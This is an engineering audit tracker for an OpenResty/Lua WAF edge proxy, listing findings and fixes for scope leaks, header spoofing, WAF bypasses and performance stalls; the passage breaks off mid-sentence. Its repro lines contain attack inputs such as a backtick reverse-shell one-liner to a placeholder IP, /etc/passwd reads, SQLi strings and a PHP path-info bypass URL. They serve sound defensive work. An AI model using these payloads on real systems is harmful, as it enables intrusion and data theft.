# Edge / Lua / OpenResty audit — 2026-07-08

> Tracking doc for the July-2026 edge audit. Companion to the machine-generated
> report; **this file is the source of truth for progress**. Tick an item when its
> fix lands and record the commit/PR next to it (see _How to use_ below).

## Scope & method

Everything the edge "touches": the in-path Lua decision path (`cfm.lua`), the WAF
and its detectors (`cfm_waf*.lua`), challenge/clearance (`cfm_clearance.lua`), the
cPanel token tunnel (`cfm_panel*.lua`), the sslcollector (`sslcollector.lua` +
`internal/sslcollector`), and the Go unix-socket bridge (`nginx_bridge.go`,
`ingest_socket.go`). Audited against three axes: **(a)** bugs / false positives on
shared hosting, **(b)** regression / avoidable CPU-RAM-traffic cost, **(c)** logic /
safety / security. Method: 21 scoped finders → triage/dedup → adversarial
double-verify → completeness critic (89 agents), then each high-severity finding
plus the regressions re-verified by hand against source.

**Result:** 71 raw → 61 unique → **55 confirmed** (6 refuted). Severity: **0 critical · 7 high · 19 medium · 28 low · 1 info**.

No pre-auth RCE or unauthenticated block-bypass that would drop a fleet; the core
decision path is sound and deliberately **fail-open**. The 7 high items are real
shared-hosting problems (two scope-boundary breaks, a source-IP spoof, a 300 ms
per-call worker stall, four WAF bypasses).

## How to use this doc

1. Pick a finding, fix it on a focused branch (repo favours many small PRs).
2. Run the CI gates (`go vet ./...`, `go test -race ./...`, `make lua`, `make test-lua`,
   the guardrail scripts) — and for edge-affecting changes the relevant runbook in
   `docs/` (e.g. `challenge-waf-release-checklist.md`).
3. **Tick the box here** and append the commit SHA / PR # in the _Fix_ line.
4. **Add a `CHANGELOG.md` `[Unreleased]` bullet** (Added/Changed/Fixed/Security), per
   CLAUDE.md §8 — that is the operator-facing record; this doc is the engineering tracker.

Status key: `[ ]` open · `[~]` in progress · `[x]` done (edit the box, keep the SHA).

---

## Progress dashboard

**17 / 55 fixed.** Grouped by severity; each links to its detail section.

### High (7)

- [x] **[F01](#f01)** · `configs/openresty.conf:880` · _security_ (axis c) — lua-stats endpoint is scope-blind: scoped cPanel viewer tokens receive fleet-wide WAF config and excludes
- [x] **[F02](#f02)** · `internal/webdetector/waf_hit_rates_api_handler.go:63` · _security_ (axis c) — WAF hit-rates API leaks cross-tenant / fleet-wide data to scoped cPanel users
- [x] **[F03](#f03)** · `configs/lua/cfm_panel_tunnel.lua:243` · _security_ (axis c) — Account-transfer tunnel forwards client-supplied X-Forwarded-For/X-Real-IP/CF-Connecting-IP verbatim to cpsrvd (source-IP spoofing)
- [x] **[F04](#f04)** · `configs/lua/cfm.lua:692` · _perf_ (axis b) — http_unix blocks ~300ms per empty-body 200 (Content-Length:0), turning every synchronous WAF-autoblock push into a worker stall / DoS amplifier
- [x] **[F05](#f05)** · `configs/lua/cfm_waf_detectors.lua:1262` · _waf-bypass_ (axis a/c) — Backtick command-substitution detector is dead code: Lua patterns have no `|` alternation, so most backtick RCE payloads bypass PAY_BACKTICK (rule 317)
- [x] **[F06](#f06)** · `configs/openresty.conf:674` · _waf-bypass_ (axis a/c) — Static-asset location bypasses cfm.lua (WAF/challenge) for any path ending in an asset extension, enabling PHP path-info WAF bypass
- [x] **[F09](#f09)** · `configs/lua/cfm_waf.lua:633` · _waf-bypass_ (axis a/c) — args consumes the shared body scan budget in get_norm_ab, so a padded query string truncates the POST body out of all body-aware WAF rules

### Medium (19)

- [x] **[F07](#f07)** · `configs/lua/cfm.lua:488` · _waf-bypass_ (axis a/c) — WAF body inspection gated by a URI allowlist: POST bodies to any non-listed path (/, /search, /checkout, clean-URL routes) are never read
- [x] **[F08](#f08)** · `configs/lua/cfm.lua:550` · _waf-bypass_ (axis a/c) — WAF body reader hard-caps at 8192 bytes, defeating larger per-type scan budgets and letting payloads past byte 8192 escape all body rules
- [x] **[F10](#f10)** · `configs/lua/cfm_waf_excl.lua:79` · _regression_ (axis b) — Exclude glob compiler diverges from Go: Lua `*`->`.*`/`?`->`.` cross `/` (Go uses `[^/]*`), and Lua ignores `[]` globs Go honours — silently widening the in-path WAF-off region _(security half fixed; `[]` parity tracked below)_
- [x] **[F11](#f11)** · `configs/lua/cfm_waf.lua:1597` · _waf-bypass_ (axis a/c) — /wp-admin/ carve-out disables encoded/base64 <?php backdoor rules 437/438 on pre-auth admin-ajax.php
- [x] **[F12](#f12)** · `configs/lua/cfm_waf_detectors.lua:1904` · _waf-bypass_ (axis a/c) — detect_http_smuggling never fires: `|` alternation + case-sensitive precheck (rule 606)
- [ ] **[F13](#f13)** · `configs/lua/cfm_waf_detectors.lua:449` · _correctness_ (axis c) — Base64 PHP-object-injection check uses malformed `%bo%:` pattern that never matches serialized objects (B64_OBJ_INJECT dead, rule 304)
- [x] **[F14](#f14)** · `configs/lua/cfm_waf_detectors.lua:1062` · _fp_ (axis a) — value_looks_shelly word list contains common tokens (host, id, ping, more, less, head, tail, env, cat, ls, w) that FP-challenge legit system=/command= dispatcher values
- [x] **[F15](#f15)** · `configs/lua/cfm_waf_detectors.lua:1722` · _fp_ (axis a) — CT_BAD_BOUNDARY false-positives on RFC-legal multipart boundaries (`=`,`+`,`/`) used by JavaMail/SOAP/Python email clients (rule 604)
- [x] **[F16](#f16)** · `configs/lua/cfm_waf_detectors.lua:3794` · _fp_ (axis a) — Encoded-<?php opener rule (437) false-positives on legit content POSTs (comments, forum posts, rich-text) at challenge tier
- [ ] **[F17](#f17)** · `configs/lua/cfm_clamav.lua:82` · _security_ (axis c) — ClamAV upload scan silently skipped when multipart filename= sits beyond the 8KB WAF body cap
- [ ] **[F19](#f19)** · `configs/lua/sslcollector.lua:743` · _perf_ (axis b) — sslcollector re-parses PEM cert+key to DER on every TLS handshake (parsed material never cached)
- [ ] **[F20](#f20)** · `configs/lua/cfm_stats.lua:134` · _perf_ (axis b) — cfm_stats decisions_stats/sslcache_stats call get_keys() with large N, locking the hot cfm_decisions dict on every dashboard poll
- [ ] **[F21](#f21)** · `configs/lua/cfm_rules.lua:58` · _fp_ (axis a) — cfm_rules throttle lock contention fails toward 429, over-throttling legit bursts from shared/NAT IPs
- [ ] **[F22](#f22)** · `configs/lua/cfm_ua_emergency.lua:322` · _perf_ (axis b) — UA-emergency throttle churns the shared cfm_decisions dict (3 writes + spin-lock per request) under the bot wave it targets
- [ ] **[F24](#f24)** · `configs/lua/cfm_waf_detectors.lua:850` · _perf_ (axis b) — is_known_legit_xmlrpc normalizes args AND body on every request before the cheap /xmlrpc.php URI gate
- [ ] **[F25](#f25)** · `configs/lua/cfm.lua:1121` · _perf_ (axis b) — Per-IP geo results and abuse counters share the high-churn cfm_decisions dict; geo uses a 3.3x-longer 300s TTL and negatively caches transient lookup failures
- [ ] **[F26](#f26)** · `internal/webdetector/ingest_socket.go:155` · _dos_ (axis b/c) — Ingest socket bufio.ReadString does not bound line length — unbounded memory (comment falsely claims a 256KB bound)
- [x] **[F27](#f27)** · `internal/sslcollector/socketapi.go:312` · _regression_ (axis b) — sslcollector socket restart race: old listener's Close() unlinks the freshly-bound new socket, breaking cert delivery until next restart
- [x] **[F28](#f28)** · `internal/sslcollector/lifecycle.go:113` · _correctness_ (axis c) — sslcollector socket server that exits on its own (Serve error) is never restarted

### Low (28)

- [ ] **[F30](#f30)** · `configs/lua/cfm_waf.lua:617` · _waf-bypass_ (axis a/c) — URI+args scan capped at 2048 bytes lets query-string padding push a payload past traversal/RCE/XSS/SQLi URI inspection
- [ ] **[F31](#f31)** · `configs/lua/cfm_waf.lua:1621` · _perf_ (axis b) — should_push dedup key embeds the volatile score/tag suffix of the reason, defeating the (ip,reason) cooldown for scored/burst rules
- [ ] **[F32](#f32)** · `configs/lua/cfm_waf_excl.lua:99` · _perf_ (axis b) — matches_rule recompiles the glob Lua pattern per request per glob entry (no precompile like Go)
- [ ] **[F33](#f33)** · `configs/lua/cfm_waf_detectors.lua:488` · _waf-bypass_ (axis a/c) — XSS event-handler checks require `=` immediately after the handler name, so whitespace (`onerror =`) evades onerror/onload/onmouseover/onfocus
- [ ] **[F34](#f34)** · `configs/lua/cfm_waf_detectors.lua:1870` · _waf-bypass_ (axis a/c) — CRLF raw-newline branch matches header names case-sensitively, missing canonically-capitalized injections (rule 605)
- [ ] **[F35](#f35)** · `configs/lua/cfm_waf_detectors.lua:3148` · _waf-bypass_ (axis a/c) — Log4Shell header precheck misses canonical uppercase %7B URL-encoding of ${
- [ ] **[F36](#f36)** · `configs/lua/cfm_waf_detectors.lua:2688` · _fp_ (axis a) — C2 tunnel host list uses unbounded substring match; ix.io/ matches matrix.io/
- [ ] **[F37](#f37)** · `configs/lua/cfm_waf_detectors.lua:2790` · _waf-bypass_ (axis a/c) — detect_smuggling_cl cannot see duplicate Content-Length/Transfer-Encoding headers (table collapsed by header_string)
- [ ] **[F38](#f38)** · `configs/lua/cfm.lua:924` · _correctness_ (axis c) — Decision cache key truncates the URI to 64 bytes and omits the query string, so distinct URIs sharing a 64-char prefix share one cached verdict
- [ ] **[F39](#f39)** · `configs/lua/cfm.lua:1274` · _security_ (axis c) — Decoded control characters in ngx.var.uri are written unescaped into error-log lines, enabling log forging
- [ ] **[F40](#f40)** · `configs/lua/cfm_clearance.lua:17` · _correctness_ (axis c) — cfm_clearance normalize_host mangles IPv6-literal hosts, weakening clearance host-binding and diverging from the Go normalizer
- [ ] **[F41](#f41)** · `configs/lua/cfm_panel.lua:851` · _security_ (axis c) — Challenge scope (panel_scope) is derived from client-controlled X-CFM-Panel-Port/X-Forwarded-Port, defeating per-port clearance isolation
- [ ] **[F43](#f43)** · `configs/lua/sslcollector.lua:739` · _dos_ (axis b/c) — sslcollector emits an unbounded per-handshake WARN on every SNI cache-miss (attacker-driven log amplification)
- [ ] **[F44](#f44)** · `configs/openresty.conf:130` · _security_ (axis c) — Client-controlled X-Forwarded-Proto forwarded verbatim to origin ($cf_xfp) in DNAT-direct mode
- [ ] **[F45](#f45)** · `configs/lua/cfm_bridge_cfg.lua:70` · _security_ (axis c) — Bridge token rotation opens a fail-open enforcement window of up to the 10s cache TTL
- [ ] **[F46](#f46)** · `configs/lua/cfm_geo.lua:77` · _correctness_ (axis c) — cfm_geo disables geo permanently per worker on a transient init/open failure, with no retry until proxy reload
- [ ] **[F47](#f47)** · `configs/lua/cfm.lua:129` · _correctness_ (axis c) — Missing bridge token 500s every request (fail-closed) while a present-but-unreachable daemon fails open — behavior flips on file presence, not reachability
- [ ] **[F48](#f48)** · `configs/lua/cfm_ua_emergency.lua:133` · _perf_ (axis b) — UA-emergency refresh reads the entire JSON file on the request path every 3s per worker (not mtime as the comment claims)
- [ ] **[F49](#f49)** · `internal/webdetector/nginx_bridge.go:1619` · _dos_ (axis b/c) — Five POST bridge handlers decode request bodies with no size limit (unbounded JSON read)
- [ ] **[F51](#f51)** · `internal/webdetector/nginx_bridge.go:1388` · _dos_ (axis b/c) — Decision bridge server has no ReadTimeout/WriteTimeout/IdleTimeout and no goroutine cap on non-decision endpoints
- [ ] **[F52](#f52)** · `internal/webdetector/ingest_socket.go:145` · _dos_ (axis b/c) — Ingest socket accept loop has no cap on concurrent connections/goroutines
- [ ] **[F54](#f54)** · `internal/sslcollector/token.go:245` · _correctness_ (axis c) — Atomic Lua-token writer omits fsync before rename; a crash can expose an empty/truncated token to the edge
- [ ] **[F55](#f55)** · `internal/sslcollector/token.go:214` · _correctness_ (axis c) — Operator-supplied token emitted into Lua via Go %q can produce invalid LuaJIT and break token loading
- [ ] **[F56](#f56)** · `configs/openresty.conf:623` · _security_ (axis c) — /__ssl_debug protected only by forgeable `allow 127.0.0.1`, unlike purge-ip's documented second loopback gate
- [ ] **[F57](#f57)** · `configs/lua/cfm_purge.lua:128` · _perf_ (axis b) — purge_ip scans the entire cfm_decisions dict under lock (get_keys(0)) on a force-unblock
- [ ] **[F58](#f58)** · `configs/lua/cfm_waf_detectors.lua:1117` · _perf_ (axis b) — args-only normalize(cap(args)) recomputed by ~6 detectors per request instead of being memoized once
- [ ] **[F59](#f59)** · `configs/lua/cfm_waf_detectors.lua:2423` · _perf_ (axis b) — Five RCE-marker detectors each rebuild lower(cap(body)) + concat on every POST body
- [ ] **[F60](#f60)** · `configs/lua/cfm_origin_ka.lua:172` · _correctness_ (axis c) — cfm_origin_ka emits a false "OpenResty too old / HTTPS pooling off" NOTICE and burns the one-shot warn flag when $host is empty

### Info (1)

- [ ] **[F61](#f61)** · `configs/openresty.conf:80` · _security_ (axis c) — server_tokens not disabled — proxy version leaked in Server header and error pages

---

## Findings (detail)

## High

<a id="f01"></a>
### F01 — lua-stats endpoint is scope-blind: scoped cPanel viewer tokens receive fleet-wide WAF config and excludes

- **Status:** ☑ done — admin-only `auth_request` gate (`/api/v1/admin/authcheck`)
- **Severity:** high · **Category:** security (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/openresty.conf:880`

**What & why.** /cfm-admin/lua-stats gates only via auth_request to /api/v1/tokens/me (RequireScopedOrAdmin), which returns 200 for ANY valid token including scoped cPanel viewer tokens. No admin re-check exists in the location or cfm_stats, so a scoped tenant gets the global blob: every tenant's WAF exclude host_rules/path_rules, per-rule modes (logonly vs block), cert counts and decision-cache breakdown. Violates the scoped-vs-admin hard boundary (must 403). Also hands attackers other tenants' exclude lists and rule tiers to craft bypasses.

**Repro / cost.** As a scoped cPanel viewer token (200s at /tokens/me, not admin): GET /cfm-admin/lua-stats -> 200 with fleet-wide stats incl. other vhosts' WAF excludes and rule modes. Expected 403.

**Suggested fix.** Gate on admin only (point auth_request at an admin-only endpoint or assert IsAdminRequest before serving).

**Fix landed:** Added admin-only auth probe `GET /api/v1/admin/authcheck` (`RequireAdmin`, 403 for scoped) in `token_api.go`; repointed the `__cfm_admin_auth_check` `auth_request` gate from `/api/v1/tokens/me` to it in **both** `openresty.conf` and `angie.conf` (2 server blocks each). Tests `TestAdminAuthCheck_{AdminAllowed,ScopedForbidden}`. Scope inventory updated. Branch `claude/lua-openresty-audit-cdmcc4`.

---

<a id="f02"></a>
### F02 — WAF hit-rates API leaks cross-tenant / fleet-wide data to scoped cPanel users

- **Status:** ☑ done — `vhostAllowed` host-scope guard in `handleWAFHitRates`
- **Severity:** high · **Category:** security (axis c) · **Verify:** CONFIRMED
- **Location:** `internal/webdetector/waf_hit_rates_api_handler.go:63`

**What & why.** handleWAFHitRates (GET /api/v1/waf/hit-rates) gates only on RequireScopedOrAdmin, reads host from the query verbatim and passes it to WAFInspected/WAFHitsByRuleID where host=='' means aggregate across ALL vhosts. It never calls validateScopedVhostQuery or vhostAllowed filtering, unlike its sibling handleWAFEngineSummary. A scoped tenant can read fleet-wide or arbitrary-tenant WAF hit profiles. Scoped-vs-admin hard boundary break.

**Repro / cost.** Scoped viewer token: GET /api/v1/waf/hit-rates (no host) returns per-rule Hits summed over every vhost; ?host=othertenant.com returns another tenant's profile. Neither 403s.

**Suggested fix.** Mirror handleWAFEngineSummary: validateScopedVhostQuery(r,'host') and force scoped callers to their vhost set when host is empty, or make endpoint admin-only.

**Fix landed:** `handleWAFHitRates` now enforces token scope, keyed on **role** (`!IsAdminRequest`, not `scope != nil`) so a vhost-less scoped token can't be misread as admin: a non-admin caller must target a single host inside a **non-empty** allowlist; empty host, empty/nil scope, or out-of-scope host → `403` via `vhostAllowed`. Host is lowercased once so authz and the case-sensitive history read agree. Admin/loopback unchanged. Mirrors `scopedMySQLFilterHandler`/`handleChallengeVhost`. Test `TestHandleWAFHitRates_ScopeEnforced` (in-scope 200, mixed-case 200 + body-data check, out-of-scope 403, empty 403, nil-scope 403, admin fleet-wide 200). Scope inventory updated. Branch `claude/lua-openresty-audit-cdmcc4`. Hardening from the branch code-review (F02 nil-scope fail-open + mixed-case data quirk).

---

<a id="f03"></a>
### F03 — Account-transfer tunnel forwards client-supplied X-Forwarded-For/X-Real-IP/CF-Connecting-IP verbatim to cpsrvd (source-IP spoofing)

- **Status:** ☑ done — strip-then-inject the forwarding/real-IP header set (overwrite, matching the sibling `$remote_addr`)
- **Severity:** high · **Category:** security (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_panel_tunnel.lua:243`

**What & why.** maybe_add() only injects a forwarding header if the client did not already send it, so a client's own X-Forwarded-For/X-Real-IP/CF-Connecting-IP is replayed unchanged to the loopback cpsrvd upstream. cpsrvd trusts the loopback proxy and honours the forwarded IP for cPHulk/audit attribution, so a client hitting /acctxferrsync|/acctxferdsync can forge its apparent source IP (evade IP-based cPHulk allow/deny, poison transfer/audit logs). The sibling non-rsync location uses proxy_set_header X-Real-IP $remote_addr which REPLACES, so this path diverges and is exploitable.

**Repro / cost.** GET /acctxferrsync/acct... with header X-Forwarded-For: 8.8.8.8 -> got['x-forwarded-for'] true -> maybe_add returns '' -> client value sent to cpsrvd unmodified; cpsrvd attributes to 8.8.8.8.

**Suggested fix.** Strip any client X-Forwarded-*/X-Real-IP/CF-Connecting-IP from raw_headers before replay and unconditionally set them from ngx.var.remote_addr.

**Fix landed:** `cfm_panel_tunnel.lua` now takes sole authority over the forwarding/real-IP header set. It rebuilds the header block from `raw_header()`, **stripping every client-supplied** `X-Real-IP`/`X-Forwarded-For`/`X-Forwarded-Host`/`X-Forwarded-Port`/`X-Forwarded-Proto`/`X-Forwarded-Server`/`CF-Connecting-IP` (case-insensitively, incl. obsolete folded continuation lines so a spoof can't survive as an orphan fold), then injects the trusted values unconditionally from `ngx.var.remote_addr`/`host`/`server_port`/`scheme` — an **overwrite**, exactly mirroring the sibling `location ~ ^/(acctxfer|...)` block's `proxy_set_header … $remote_addr`. Scope: **all 7** headers (user-chosen, matches the sibling exactly and closes host/proto-confusion too), not just the 3 IP-bearing ones. Obsolete line folding (RFC 7230 §3.2.4) is dropped **wholesale** — any continuation line (leading SP/HT) is discarded, off a stripped *or* a surviving header — so a spoofed `\r\n X-Forwarded-For: …` cannot ride in as a fold of a benign header (the raw equivalent of nginx's parse/normalise on the sibling path). `$remote_addr` is authoritative here (these listeners carry no client-facing `set_real_ip_from`; transfers don't traverse Cloudflare) and not itself spoofable. **No-op for legitimate transfers** — `whm_xfer_download-ssl` is a direct client that never sends these headers (nor folds any), so it gets the same `$remote_addr`-derived values as before; only a *malicious* client's forged header/fold changes (it is dropped). Two stale/misleading comment blocks (the "we do NOT inject" SECURITY NOTE and the "preserve them (don't double-inject)" Step 3 note) rewritten to match. Test `scripts/tests/cfm_panel_tunnel_xff_test.lua` harnesses the real tunnel (stubbed cosockets/threads) and asserts on the exact bytes sent upstream: legit no-op (byte-identical, CRLFCRLF-terminated), spoofed XFF/X-Real-IP/CF-Connecting-IP overwritten, duplicate headers all stripped, fold-smuggle off a benign header AND off the request line dropped, benign fold dropped — **verified to FAIL against the pre-fix file** (spoofed `6.6.6.6` survived) and against the first-cut conditional-fold version (fold-smuggle survived), PASS after. **Follow-up (documented, not a regression):** `True-Client-IP`/`X-Client-IP`/`Client-IP`/`Forwarded:` (RFC 7239) are NOT stripped — cpsrvd keys on `X-Forwarded-For`, and the sibling `proxy_set_header` blocks pass these through too, so this matches the sibling exactly; revisit only if cpsrvd's trusted-header set is ever broadened (would be a product-wide change on both paths). Adversarially reviewed (verdict: ship; the wholesale-fold-drop and test fixes were folded in on the reviewer's recommendation). PR #1054.

---

<a id="f04"></a>
### F04 — http_unix blocks ~300ms per empty-body 200 (Content-Length:0), turning every synchronous WAF-autoblock push into a worker stall / DoS amplifier

- **Status:** ☑ done — `Content-Length: 0` fast-path in `http_unix`
- **Severity:** high · **Category:** perf (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm.lua:692`

**What & why.** Confirmed at cfm.lua:687-692: for a 200 with Content-Length:0, `content_length and content_length>0` is false and is_chunked false, so control falls to `s:receive('*a')`. Because the request used keep-alive the bridge does not close, so '*a' blocks until the read timeout (CFG.decision_timeout_ms, default 300ms). The bridge's ip/vhost push/clear handlers (handleIPPush etc.) reply exactly 200 CL:0. The hot-path caller is the synchronous WAF autoblock push rpc_call('ip_push') at cfm.lua:1450, so every WAF push that clears should_push dedup adds ~300ms of blocked worker light-thread time. Under a WAF-tripping flood of distinct (ip,reason) pairs this ties up worker capacity = amplifier.

**Repro / cost.** Client trips a block-tier WAF rule -> should_push true -> cfm.lua:1450 POST /nginx/ip -> handleIPPush returns 200 CL:0 -> http_unix takes the '*a' branch and blocks ~300ms before returning ''.

**Suggested fix.** Short-circuit known-zero bodies: `if method=='HEAD' or code==204 or code==304 or content_length==0 then resp=''`; never fall to a blocking '*a' read on a keep-alive connection.

**Fix landed:** `cfm.lua` `http_unix` now returns `""` immediately on an explicit `Content-Length: 0` (added `elseif content_length == 0 then resp = ""` before the fall-through `receive("*a")`), so the bridge push/clear/observe replies no longer stall the worker for `decision_timeout_ms`. Lua gates pass (`make lua`, `make test-lua`). CHANGELOG `[Unreleased] → Fixed`. Branch `claude/lua-openresty-audit-cdmcc4`.

---

<a id="f05"></a>
### F05 — Backtick command-substitution detector is dead code: Lua patterns have no `|` alternation, so most backtick RCE payloads bypass PAY_BACKTICK (rule 317)

- **Status:** ☐ open
- **Severity:** high · **Category:** waf-bypass (axis a/c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:1262`

**What & why.** Confirmed at line 1262: has_backtick_cmd uses inner:match('^%s*(wget|curl|bash|sh|nc|...|ping)%f[^%a]'). In Lua patterns `|` is a literal byte, so this only matches the impossible literal string 'wget|curl|...'; it never fires. The only surviving signal is the fallback inner:find(';'/'|'/'&&'). detect_rce hard-codes only backtick wget/curl, so backtick bash/sh/nc/perl/python/php/ruby/whoami/cat/etc. without ;|&& are caught by neither detector.

**Repro / cost.** ?x=`whoami` or ?x=`cat /etc/passwd` or ?x=`bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`: inner has no ;|&&, alternation match is nil, has_backtick_cmd false, rule 317 never fires; detect_rce misses too.

**Suggested fix.** Replace the alternation with a loop over a command table testing inner:match('^%s*'..cmd..'%f[^%a]') per word (style used by CMD_PARAM_SHELL_WORDS).

**Fix landed:** `has_backtick_cmd` now captures the leading token (`inner:match("^%s*(%a+)")`) and tests membership in a module-scope `BACKTICK_CMDS` set (word must match a command exactly — `` `category` `` ≠ `cat`). Metachar branch unchanged. Tier kept at **challenge** (rule 317, not block — confirmed acceptable). Search-field carve-out (`ignore_backtick_only`) preserved. Test `cfm_waf_backtick_smuggling_test.lua` (7 TP commands + metachar regression + FP negatives incl. word-boundary and search-field suppression). Branch `claude/lua-openresty-audit-cdmcc4`. **Code-review hardening:** the search-field suppression was request-global (a throwaway benign `q=\`x\`` masked a command in another param) — the final check now re-tests with search-field values stripped so a hit elsewhere still fires (test added). **Residual (accepted, monitored):** the newly-live command-word branch can FP-challenge backtick code in a NON-search GET query param — kept at challenge per operator call; watch rule 317 via `/api/v1/waf/hit-rates`. Known non-regressions left out of scope: whitelist evasions (`/bin/sh`, `env`, `sudo`, unlisted binaries) — bare-command allowlist matches the original intent.

---

<a id="f06"></a>
### F06 — Static-asset location bypasses cfm.lua (WAF/challenge) for any path ending in an asset extension, enabling PHP path-info WAF bypass

- **Status:** ☑ done — static-bypass location regex now excludes `.php…/` path-info
- **Severity:** high · **Category:** waf-bypass (axis a/c) · **Verify:** CONFIRMED
- **Location:** `configs/openresty.conf:674`

**What & why.** The static-asset location `location ~* \.(css|js|woff|...|map)(?:\?.*)?$` runs access_by_lua_block{return;}, fully skipping cfm.lua. nginx matches the regex against the decoded path (unanchored), so /uploads/evil.php/x.js matches the .js$ bypass but NOT the .php location. On origins with cgi.fix_pathinfo the request executes evil.php with the WAF disabled. Identical in angie.conf (658/1121) and openresty.conf second block (1141).

**Repro / cost.** GET /uploads/evil.php/a.js -> matches static .js$ location -> access_by_lua_block{return;} -> proxied to origin with WAF off -> fix_pathinfo executes evil.php.

**Suggested fix.** Guard the static bypass to reject paths containing .php/.phtml earlier in the path, or require the whole path to match a safe static pattern.

**Fix landed:** All 4 static-bypass locations (openresty.conf HTTP+HTTPS, angie.conf HTTP+HTTPS) now anchor the regex with a leading PHP-scoped negative-lookahead: `location ~* "^(?!.*\.(?:phtml|pht|php[0-9]|php|phar)/).*\.(?:css|js|…|map)$"`. Any URL containing a `.php…/` (also `.phtml/`, `.pht/`, `.php5/`, `.phar/`) segment no longer matches the bypass and falls through to the server-level cfm.lua, so path-info exec vectors are inspected again. **Option A (PHP-scoped)** was chosen over a whole-path allowlist: it closes the exec vector with **zero FP** on genuine static — including `?v=` cache-busters (nginx location matching runs against `$uri`, which excludes the query, so the old inert `(?:\?.*)?$` tail was dropped) and legitimately-named `foo.php.css`. **Residuals (accepted, documented in-config), narrower than the `.php/` case and still seen by the log-driven engine:** (1) a real `.css` that mod_rewrites to a front controller with a malicious query; (2) a multi-extension name like `/evil.php.jpg/x.css` — executes as PHP only under the legacy `AddHandler …/x-httpd-php .php` form, NOT modern EA4 `<FilesMatch \.php$>`; closing it would require a `[./]`-after-php lookahead that FPs on legit `foo.php.css` under EA4, so it is intentionally left; (3) non-PHP path-info handlers (`.cgi`/`.pl`/`.py`/`.shtml`), out of the deliberately PHP-scoped guard. The guard covers the universal fix_pathinfo `.php/` vector that executes regardless of handler style. Verified three ways: (1) PCRE logic — 14/14 cases incl. `/evil.php/x.css` & `/x.phar/y.css`→fall-through, uppercase `.PHP/`, `.php5/`/`.phtml/`/`.pht/`, `/a.php.css`→static, `/evil.php.jpg/x.css`→static (residual); (2) `nginx -t` parses the quoted negative-lookahead location; (3) **live nginx routing** — `/style.css`, `/app.js?v=123`, `/img/logo.PNG`, `/a.php.css` route to the static fast-path while `/evil.php/x.css`, `/x.phar/y.css`, `/uploads/shell.php/avatar.png`, `/wp-content/x.php/loader.js` fall through to WAF. Adversarially reviewed (verdict: ship; no encoded-slash `%2f` bypass — nginx decodes into `$uri` before location matching; `phar` added and residuals disclosed on the reviewer's recommendation). PR #1053.

---

<a id="f09"></a>
### F09 — args consumes the shared body scan budget in get_norm_ab, so a padded query string truncates the POST body out of all body-aware WAF rules

- **Status:** ☑ done — args and body capped independently in `get_norm_ab`
- **Severity:** high · **Category:** waf-bypass (axis a/c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf.lua:633`

**What & why.** get_norm_ab() = normalize(cap(args..'&'..body, budget)) where budget is a Content-Type body budget. Because attacker-controlled args is prepended and a single cap() applies to the merged string, a large query string eats into or fully consumes the body space; when #args>=budget the body is dropped. This is the only body-inclusive scan string for SQLi(301), php_wrappers(305), ssrf(701), js_proto(303), log4shell(328), c2_tunnel(702), superglobal(318), and those detectors use only the passed _s (uri/args-alone branches ignore body).

**Repro / cost.** POST /x.php?p=<8192 'a'> with urlencoded body q=1' UNION SELECT ...: cap(args..'&'..body,8192) yields only the args prefix; body SQLi truncated away, never inspected.

**Suggested fix.** Give the body its own budget: normalize(cap(args,args_budget)..'&'..cap(body,body_budget)).

**Fix landed:** `get_norm_ab` now caps args and body **independently**, each to the body budget, before the concat: `normalize(cap(args,budget) .. "&" .. cap(body,budget))`. The body always gets its full budget, so a padded query can no longer evict it; transient bounded to ~2*budget with no large-body materialisation. Test `cfm_waf_body_budget_test.lua` Test 9 — verified to FAIL on the pre-fix single-cap form and PASS after. Existing over-budget truncation tests (Test 8) still hold. **Code-review follow-ups:** (1) a review sweep found the same args-first single-cap pattern in `detect_crlf_injection` (rule 605, **live** — builds its own scan surface) and in 5 detector-internal `_ns or …` fallbacks (dead today but a §5 divergent copy that would re-introduce F09 on a future refactor) — all mirrored to independent caps. (2) Test 9 expanded to cover the JSON budget (32768), a second detector (body-borne `UNION SELECT` via `WAF_SQLI`), and the separate CRLF scan surface — all four F09 cases verified to fail with the fixes reverted. PR #1052.

---

## Medium

<a id="f07"></a>
### F07 — WAF body inspection gated by a URI allowlist: POST bodies to any non-listed path (/, /search, /checkout, clean-URL routes) are never read

- **Status:** ☑ done — body read for all POST/PUT/PATCH with an inspectable Content-Type (POST allowlist kept as fast-path; PUT/PATCH always size-gated)
- **Severity:** medium · **Category:** waf-bypass (axis a/c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm.lua:488`

**What & why.** waf_should_read_body() is a positive allowlist (wp-*, /api/, /admin, /login, *.php, /graphql, /rest/, etc.). For any other POST URI it returns false and get_req_body_for_waf() returns ''. All body-aware detectors (SQLi/RCE/XSS/traversal via get_norm_ab, upload/webshell scanners) then see an empty body. The Go log-driven engine only scores access logs (no body), so nothing compensates. An attacker picks any extension-less dynamic endpoint at a vulnerable co-tenant app to smuggle a body-borne exploit past the WAF entirely. Also POST-only (line 508): PUT/PATCH REST bodies were never read.

**Repro / cost.** POST /process (or /, /v2/orders) with body q=' UNION SELECT ... : waf_should_read_body returns false -> body='' -> no body rule fires -> forwarded to origin. Same payload to /index.php would be inspected.

**Suggested fix.** Read (bounded) the body for all POST/PUT/PATCH with an inspectable Content-Type; keep the allowlist only as a cost hint, not the gate.

**Fix landed:** `waf_should_read_body` now: (1) accepts **POST/PUT/PATCH** (was POST-only); (2) the read/skip decision is a shared pure helper `util.waf_body_gate(ct, cl, cap)` — read iff the **Content-Type is inspectable** (`urlencoded`/`json`/`multipart`/`xml`/`text`, via `util.ct_is_inspectable`) **and** a **measured** `Content-Length ≤ waf_body_read_max_cl` (default 1 MiB, env `CFM_WAF_BODY_READ_MAX_CL`); **any** body with no declared length (chunked / `Transfer-Encoding: chunked`) is skipped — we can't size-gate what we can't measure. (3) Method handling is asymmetric to keep **zero behavioural change for existing POST flows**: a **POST** on an allowlisted URI still reads regardless of size (pre-F07 fast-path, unchanged); a POST on any other path goes through the gate; **PUT/PATCH on ANY path (incl. allowlisted) go through the gate** — they were never body-inspected before F07, so there is no "read regardless of size" legacy to preserve, and routing them through the gate *before* the allowlist stops a large `PUT /uploads/x.zip` from being force-buffered on a `proxy_request_buffering=off` location just to scan 32 KB (the review's must-fix #1). **Perf/regression analysis (the key concern with F08's 32 